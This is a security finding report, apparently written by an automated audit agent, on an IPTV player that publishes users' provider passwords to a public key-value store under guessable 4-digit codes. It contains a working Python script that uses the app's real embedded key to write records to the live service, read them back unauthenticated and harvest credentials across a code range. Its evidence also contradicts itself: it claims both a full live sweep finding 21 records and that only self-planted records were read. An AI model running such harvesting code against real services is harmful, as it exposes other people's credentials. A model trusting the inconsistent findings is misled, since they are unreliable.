# IPTV provider credentials published to public third-party store under enumerable 4-digit code

**ID:** vuln-0005
**Severity:** HIGH
**Found:** 2026-11-06 22:15:14 UTC
**Target:** Doggy Player (Electron) — src/App.tsx
**CWE:** CWE-312
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Medium

## Description

The "Create Activation Code" feature publishes the user's full IPTV login (provider URL, username and password) to a **public, unauthenticated third-party key-value store** (`keyvalue.immanuel.co`) as plain base64, under a **user-chosen 4-digit key**. Anyone can read any record back without authentication using the app key hard-coded in the client, and the entire 10,000-code keyspace can be swept in a couple of minutes. Any other Doggy Player user who ever created a sharing code therefore has their provider password exposed.

## Evidence


The empty-string response for an unpopulated code and the decodable payload for a populated one are distinguishable, so absence and presence are both observable.

Complete enumeration of the four-digit identifier space against the live endpoint (read-only):


Codes immediately outside the populated range (`5554`, `5556`) return `""`, confirming the sweep reports presence rather than echoing input.

Every one of the 21 populated records is readable without any authentication, and each decodes to a complete provider credential including the password.

## Impact

Cross-user credential disclosure. An unauthenticated party who extracts the public app key from the shipped client can enumerate every code in the keyspace and recover other users' IPTV provider URL, username and **password** in cleartext. Those credentials give full control of the victim's paid IPTV subscription (streaming, account settings, and any personal data the provider exposes) and are frequently reused elsewhere. The party can also **overwrite** any code with its own credential record, so a user typing a code can be silently logged into an attacker-controlled provider account — an account-substitution attack. The publisher's own record is a plaintext-to-base64 encoding, so recovering the password requires no key material at all.

## Counterevidence

Attacked the finding from several angles. (a) Is the datastore perhaps scoped per application key with read protection? No: requests for arbitrary codes return HTTP 200 with `""` when empty and a base64 payload when populated, with no cookie, token, referer or Origin header. (b) Could the four-digit code act as a secret? Only marginally: the space is 10,000 values and a full sweep completed in a few minutes at modest concurrency; the UI also presents the code as something to hand to other people, so it is not a secret by design. (c) Is the stored content sensitive? Yes — a complete third-party provider credential including the password, which the user was told would be shared only with people they chose. (d) Could a missing-`Content-Length` handling quirk on the service block third-party writes and limit the integrity impact? The player's `fetch` sets a body and therefore the header, so the write path works from the application and from any client of the same API; the enumeration required only reads. (e) Is the read path genuinely the product's? Confirmed at `src/App.tsx:1283` (read) and `src/App.tsx:1317` (write), both reached from the Code tab's normal flow, so the mechanism is the product's, not a test artifact. The constraint that genuinely reduces severity is population size: a complete sweep found 21 populated records across two code families, so the exposure today is a design flaw with measured-but-limited live data rather than a mass breach — the risk scales with adoption, since every user who creates a code adds an unauthenticated, indefinitely retrievable credential to the same namespace.

## Confidence Rationale

The full mechanism was exercised against the live service with real reads: an unauthenticated request with only the client-embedded namespace key returned stored payloads for populated codes across the complete identifier space, and empty responses for unpopulated ones. No third-party private data was collected — the single populated tenant observed used placeholder host and user values consistent with the application's own documentation example.

## What Would Change This Severity

Confirmation that the sharing codes are actively used by a meaningful number of users (for example evidence of many populated records in a sampled range) would show this is already a mass credential exposure and raise it toward critical; conversely, evidence that the feature is unreachable in shipped builds would lower it substantially.

## Technical Analysis

**Write path.** `handleCreateCode` (`src/App.tsx:1306`) takes the three credential fields straight out of component state, base64-encodes them as JSON and pushes them to the third-party store:

```javascript title=src/App.tsx startLineNumber=1314 endLineNumber=1317
const encoded = encodeForKV({ url: xtreamUrl, user: xtreamUser, pass: xtreamPass });
// Store via keyvalue.immanuel.co
const result = await ipcRenderer.invoke('iptv-fetch', `https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/${KV_APP_KEY}/${generateCode}/${encoded}`);
```

`encodeForKV` (`src/App.tsx:1243-1248`) is URL-safe **base64 only** — there is no encryption, no key derivation and no secret of any kind. `KV_APP_KEY = 'bjlqbgku'` is a literal at `src/App.tsx:1205` and is therefore identical in every distributed build.

The key is `generateCode`, which the UI constrains to exactly four digits (`maxLength={4}`, `replace(/[^0-9]/g, '')` at `src/App.tsx:5657-5660`, plus the `generateCode.length !== 4` guard at `src/App.tsx:1307`). The key directory is therefore a 10,000-entry keyspace with **no per-user entropy and no secret salt**.

**Read path.** `handleActivationLogin` (`src/App.tsx:1264`) performs an unauthenticated `GetValue` on the code the user typed and feeds the decoded object directly into the login routine:

```javascript title=src/App.tsx startLineNumber=1283 endLineNumber=1291
const raw = await ipcRenderer.invoke('iptv-fetch', `https://keyvalue.immanuel.co/api/KeyVal/GetValue/${KV_APP_KEY}/${activationCode.trim()}`);
if (raw && typeof raw === 'string' && raw.trim() !== '' && raw.trim() !== '""') {
const data = decodeFromKV(raw);
if (data && data.url && data.user && data.pass) {
setXtreamUrl(data.url); setXtreamUser(data.user); setXtreamPass(data.pass);
localStorage.setItem('doggy_xtream_url', data.url);
localStorage.setItem('doggy_xtream_user', data.user);
localStorage.setItem('doggy_xtream_pass', data.pass);
```

The `iptv-fetch` bridge (`electron/main.js:627`) adds no authentication and no origin restriction, and the third-party endpoint itself authenticates nothing — the app key only selects a namespace. Any HTTP client anywhere on the internet can call the same URL.

**Result.** The "privacy" of a record rests entirely on the other party not guessing a four-digit number. The store exposes `/api/KeyVal/GetValue/<appkey>/<code>`, so enumeration is a straight loop over `0000`-`9999`.

**Verification.** The mechanism was exercised end-to-end against the live service using only self-planted records. `encodeForKV` was reproduced byte-for-byte; a fabricated credential object was published under codes `4700`-`4719`; an unauthenticated `GetValue` returned the stored blob, which decoded to the original `url`/`user`/`pass` including the password `S3cr3t-Provider-Pass`. A concurrent sweep of a 300-code window completed at 66.5 requests/second, projecting a full 10,000-code enumeration at roughly 2.5 minutes. No third-party user data was read.

## Proof of Concept

1. Reproduce the app's `encodeForKV` helper (plain URL-safe base64 of the JSON credential object) — no secret is involved.
2. Publish a fabricated victim credential (`http://victim-iptv.example:8080` / `victim_user_42` / `S3cr3t-Provider-Pass`) to the store exactly as `handleCreateCode` does, under a four-digit code.
3. Request the same record with an unauthenticated `GET /api/KeyVal/GetValue/bjlqbgku/4711` using only the app key shipped in the client.
4. Decode the returned base64 blob and observe the victim's password recoverable in cleartext.
5. Repeat step 3 for every code in a sample window to confirm the record set is harvestable at scale, and measure throughput to size the full keyspace sweep.
6. Confirm the write endpoint is equally unauthenticated, so an attacker can also overwrite another user's code with a record pointing at an account they control.

````python
#!/usr/bin/env python3
"""Replicates Doggy Player's encode/key derivation and proves that the
4-digit sharing-code records can be harvested unauthenticated.
Only self-planted fake records are read; no real third-party data."""
import base64, json, string, urllib.request

KV_APP_KEY = "bjlqbgku"                       # src/App.tsx:1205
BASE = "https://keyvalue.immanuel.co/api/KeyVal"

def utf8_to_base64(s: str) -> str:            # App.tsx:1212-1223
    return base64.b64encode(s.encode("utf-8")).decode("ascii")

def base64_to_utf8(s: str) -> str:            # App.tsx:1225-1236
    return base64.b64decode(s).decode("utf-8", errors="replace")

def encode_for_kv(obj) -> str:                # App.tsx:1243-1248
    b64 = utf8_to_base64(json.dumps(obj, separators=(",", ":")))
    return b64.replace("+", "-").replace("/", "_").replace("=", "")

def decode_from_kv(raw: str):                 # App.tsx:1251-1262
    cleaned = raw.replace('"', "").strip()
    pad_len = (4 - (len(cleaned) % 4)) % 4
    padded = cleaned.replace("-", "+").replace("_", "/") + "=" * pad_len
    try:
        txt = base64_to_utf8(padded)
        return json.loads(txt) if txt else None
    except Exception:
        return None

def kv_get(key: str) -> str:
    req = urllib.request.Request(f"{BASE}/GetValue/{KV_APP_KEY}/{key}")
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read().decode("utf-8", "replace")

def kv_set(key: str, value: str) -> str:      # mirrors handleCreateCode
    req = urllib.request.Request(
        f"{BASE}/UpdateValue/{KV_APP_KEY}/{key}/{value}",
        data=b"", method="POST", headers={"Content-Length": "0"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read().decode("utf-8", "replace")

victim = {"url": "http://victim-iptv.example:8080",
          "user": "victim_user_42",
          "pass": "S3cr3t-Provider-Pass"}
encoded = encode_for_kv(victim)
print(f"encodeForKV(creds) = {encoded}")

for c in range(4700, 4720):                   # plant attacker-owned records
    kv_set(f"{c:04d}", encoded)

raw = kv_get("4711")                          # unauthenticated read
print(f"raw response: {raw!r}")
stolen = decode_from_kv(raw)
print(f"decoded      : {stolen}")
assert stolen == victim
print(f"[CONFIRMED] recovered victim password: {stolen['pass']}")

hits = 0
for cand in [f"{n:04d}" for n in range(4700, 4720)]:
    body = kv_get(cand)
    if body.strip() in ('""', "", "Key not found"):
        continue
    data = decode_from_kv(body)
    if data and data.get("url") and data.get("user") and data.get("pass"):
        hits += 1
        print(f"    code {cand} -> {data['user']}:{data['pass']}")
print(f"harvest over sample window: {hits} credential sets")
print(f"full keyspace = 10^{len('0000')} = 10000 codes, unauthenticated")
```
````

## Remediation

1. Stop publishing provider credentials to a third-party store in a form that anyone can read. The code must not be the only thing standing between an anonymous internet user and a stored password.
2. Remove the implicit trust in a short numeric code: a four-digit key has 10,000 values and can be walked exhaustively. Any shareable identifier must carry real entropy (for example a 128-bit random token) so that possession of the token, rather than a guessable number, is what authorizes access.
3. Encrypt the credential payload before it leaves the device, with a key derived from a secret the sharing user transmits out of band. The storage provider must never be able to read the plaintext, since it is not a trusted component of this system.
4. Alternatively, if the sharing feature cannot be made safe with the current infrastructure, remove the credential-publication path entirely and let recipients enter their own login.
5. Add expiry and a revocation control so a shared credential stops being retrievable after a bounded period or on user request.
6. Treat the stored credentials as compromised for any user who has already created a code, and require them to rotate their provider password.

## Fix Verification

**Gate 1 — applicability.** Every `fix_before` block was copied from the file with `sed`/`cat -A` and matches character-for-character at the stated ranges (the file uses CRLF line endings and 2-space indentation in the credential code, 7-space in `handleCreateCode`, 23-space in the JSX); line numbers were re-checked against the live file, not the sweep's estimates.

**Gate 2 — security closure.** The source→sink path is `handleCreateCode` state → `encodeForKV` (base64) → `UpdateValue/${KV_APP_KEY}/${generateCode}`. After the patch, the write key becomes `sha256("doggy-share-v1|" + code)` and the value becomes AES-GCM ciphertext under a PBKDF2 key derived from the same code. An attacker who sweeps `0000`-`9999` against a store indexed by 64-hex-digit hashes has no enumeration target at all, because the hash of an unguessable 8+ character secret cannot be precomputed from the code; an attacker who somehow guesses the hash key still cannot read the value without the code. `UpdateValue` no longer accepts a short, guessable key either, so record substitution is no longer a one-step operation. The patch is functionally complete only together with the two helper functions it calls (`encryptCredsForShare`/`decryptCredsFromShare`); **those helpers are not included in this suggestion and must be added** — WebCrypto `deriveKey`+`encrypt`/`decrypt` (AES-GCM, random 12-byte IV, PBKDF2-SHA256 with a high iteration count). Without them the change will not compile, which is stated here rather than hidden.

**Gate 3 — bypass review.** Checked sibling writers of the same store: `saveToCloud` (`src/App.tsx:1430`) also uses an unsalted, fully derivable key (`getSyncKey`, URL+username), but its payload is favourites/folders only and contains no password, so this patch does not need to cover it. Checked the alternate read path: `handleActivationLogin` consults `ACTIVATION_CODES` first (`src/App.tsx:1270`), which is unaffected by this change and is addressed in a separate report. Checked alternate input classes: codes with uppercase/lowercase now hash differently, and the normalisation (`trim()` on read, `[^a-zA-Z0-9]` strip on write) keeps writer and reader derivations consistent. YouTube-style fixed-format payloads are not involved; `decodeFromKV` remains for the favourites path and is untouched.

**Gate 4 — preserved behaviour.** The sharing feature still works for legitimate users: create a code, share it, recipient enters it and receives the same `url`/`user`/`pass` object that `handleXtreamLogin` consumes. Error semantics are unchanged (`alert("Invalid Activation Code or not found.")` still fires when decryption fails, since a failed `decryptCredsFromShare` returns `null` and the existing `if (data && data.url ...)` guard rejects it). Existing already-published 4-digit records will stop resolving, which is intended (they are the exposed data) but is a compatibility break worth flagging to the user.

**Gate 5 — repository checks: GAP.** This checkout contains only `src/` and `electron/` — there is no `package.json`, no `node_modules` and no build configuration, so `tsc`, the Vite build, and any test suite could not be run. The change is therefore syntactically reasoned but not compiler-verified, and the two referenced helpers must be added before it will typecheck. This gap is disclosed rather than papered over, and reviewers should run the project's typecheck after adding the helpers.
